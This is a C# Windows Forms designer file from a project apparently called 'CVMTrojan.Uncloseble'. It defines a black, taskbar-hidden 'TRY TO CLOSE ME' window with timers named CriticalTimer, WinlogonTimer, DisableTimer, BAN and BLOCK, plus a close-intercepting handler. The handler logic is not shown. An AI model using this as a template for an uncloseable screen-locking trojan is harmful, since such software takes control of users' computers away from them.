namespace CVMTrojan.Uncloseble
{
    partial class Form1
    {
        /// <summary>
        /// Обязательная переменная конструктора.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Освободить все используемые ресурсы.
        /// </summary>
        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Код, автоматически созданный конструктором форм Windows

        /// <summary>
        /// Требуемый метод для поддержки конструктора — не изменяйте 
        /// содержимое этого метода с помощью редактора кода.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.CriticalTimer = new System.Windows.Forms.Timer(this.components);
            this.WinlogonTimer = new System.Windows.Forms.Timer(this.components);
            this.DisableTimer = new System.Windows.Forms.Timer(this.components);
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.TopMostTimer = new System.Windows.Forms.Timer(this.components);
            this.label6 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.BAN = new System.Windows.Forms.Timer(this.components);
            this.BLOCK = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // CriticalTimer
            // 
            this.CriticalTimer.Interval = 10;
            this.CriticalTimer.Tick += new System.EventHandler(this.CriticalTimer_Tick);
            // 
            // WinlogonTimer
            // 
            this.WinlogonTimer.Tick += new System.EventHandler(this.WinlogonTimer_Tick);
            // 
            // DisableTimer
            // 
            this.DisableTimer.Interval = 5000;
            this.DisableTimer.Tick += new System.EventHandler(this.DisableTimer_Tick);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 128F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(111, 9);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(423, 193);
            this.label1.TabIndex = 0;
            this.label1.Text = "TRY";
            this.label1.Click += new System.EventHandler(this.label1_Click);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 64F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(237, 190);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(162, 97);
            this.label2.TabIndex = 1;
            this.label2.Text = "TO";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 36F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label3.ForeColor = System.Drawing.Color.White;
            this.label3.Location = new System.Drawing.Point(226, 287);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(187, 55);
            this.label3.TabIndex = 2;
            this.label3.Text = "CLOSE";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 64F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label4.ForeColor = System.Drawing.Color.White;
            this.label4.Location = new System.Drawing.Point(237, 342);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(171, 97);
            this.label4.TabIndex = 3;
            this.label4.Text = "ME";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 20F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label5.ForeColor = System.Drawing.Color.White;
            this.label5.Location = new System.Drawing.Point(534, 408);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(39, 31);
            this.label5.TabIndex = 4;
            this.label5.Text = "=)";
            // 
            // TopMostTimer
            // 
            this.TopMostTimer.Interval = 1;
            this.TopMostTimer.Tick += new System.EventHandler(this.TopMostTimer_Tick);
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.ForeColor = System.Drawing.Color.White;
            this.label6.Location = new System.Drawing.Point(12, 516);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(154, 13);
            this.label6.TabIndex = 5;
            this.label6.Text = "v1.0 c0d9d by AnonCVMCoder";
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Font = new System.Drawing.Font("Microsoft Sans Serif", 36F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label7.ForeColor = System.Drawing.Color.White;
            this.label7.Location = new System.Drawing.Point(207, 439);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(273, 55);
            this.label7.TabIndex = 6;
            this.label7.Text = "Sussy buka";
            // 
            // BAN
            // 
            this.BAN.Interval = 1000;
            this.BAN.Tick += new System.EventHandler(this.BAN_Tick);
            // 
            // BLOCK
            // 
            this.BLOCK.Tick += new System.EventHandler(this.BLOCK_Tick);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(664, 538);
            this.Controls.Add(this.label7);
            this.Controls.Add(this.label6);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.label1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Form1";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "TRY TO CLOSE ME";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Timer CriticalTimer;
        private System.Windows.Forms.Timer WinlogonTimer;
        private System.Windows.Forms.Timer DisableTimer;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Timer TopMostTimer;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.Timer BAN;
        private System.Windows.Forms.Timer BLOCK;
    }
}

